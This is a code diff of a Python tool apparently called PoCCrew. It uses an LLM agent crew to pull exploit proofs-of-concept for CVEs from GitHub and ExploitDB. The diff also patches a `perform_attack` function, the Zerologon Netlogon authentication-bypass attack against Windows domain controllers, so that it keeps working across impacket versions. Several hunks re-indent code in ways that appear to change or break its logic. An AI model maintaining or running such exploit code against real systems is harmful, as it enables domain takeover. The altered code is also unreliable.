@@ -19,9 +19,9 @@ class PoCCrew:
         try:
             self.llm = ChatOpenAI(
                 model=config.LLM_MODEL,
-                temperature=config.LLM_TEMPERATURE,
+                                temperature=config.LLM_TEMPERATURE,
                 api_key=config.OPENAI_API_KEY
-            )
+                            )
             
             self.exploit_hunter = self._create_exploit_hunter()
             self.poc_validator = self._create_poc_validator()
@@ -191,17 +191,17 @@ class PoCCrew:
                 
                 response = requests.get(url, params=params, timeout=10)
                 
-                if response.status_code == 200:
-                    data = response.json()
-                    
-                    for repo in data.get('items', []):
-                        if len(pocs) >= 3:  # Limit results
-                            break
-                            
-                        # Get repository content
-                        code_content = self._get_github_code(repo['full_name'], cve_id)
+            if response.status_code == 200:
+                data = response.json()
+                
+                for repo in data.get('items', []):
+                    if len(pocs) >= 3:  # Limit results
+                        break
                         
-                        poc = PoCInfo(
+                    # Get repository content
+                    code_content = self._get_github_code(repo['full_name'], cve_id)
+                    
+                    poc = PoCInfo(
                             source="GitHub",
                             url=repo['html_url'],
                             description=repo['description'] or f"PoC for {cve_id}",
@@ -212,11 +212,11 @@ class PoCCrew:
                             execution_command=f"python3 {repo['name']}.py",
                             file_extension=".py",
                             code_language="python"
-                        )
-                        pocs.append(poc)
+                    )
+                    pocs.append(poc)
                 
                 time.sleep(1)  # Rate limiting
-                
+        
         except Exception as e:
             logger.debug(f"GitHub search failed for {cve_id}: {e}")
         
@@ -284,7 +284,7 @@ class PoCCrew:
                         code_language="python"
                     )
                     pocs.append(poc)
-                    
+        
         except Exception as e:
             logger.debug(f"ExploitDB search failed for {cve_id}: {e}")
         
@@ -339,7 +339,12 @@ def perform_attack(dc_handle, dc_ip, target_computer):
         auth_request = nrpc.NetrServerAuthenticate3()
         auth_request['PrimaryName'] = dc_handle + '\\x00'
         auth_request['AccountName'] = target_computer + '$\\x00'
-        auth_request['SecureChannelType'] = nrpc.USER_ACCOUNT
+        # Use the correct SecureChannelType value for impacket compatibility
+        try:
+            auth_request['SecureChannelType'] = nrpc.USER_ACCOUNT
+        except AttributeError:
+            # Fallback for newer impacket versions
+            auth_request['SecureChannelType'] = 0x00000001
         auth_request['ComputerName'] = target_computer + '\\x00'
         auth_request['ClientCredential'] = b'\\x00' * 8
         auth_request['NegotiateFlags'] = 0x212fffff
@@ -544,7 +549,7 @@ if __name__ == '__main__':
                     poc.description += f" [CrewAI Enhanced: Validated and assessed for reliability]"
             
             logger.info(f"Enhanced {len(pocs)} PoCs for {cve_id} using CrewAI analysis")
-            
+        
         except Exception as e:
             logger.debug(f"CrewAI enhancement failed for {cve_id}: {e}")
         
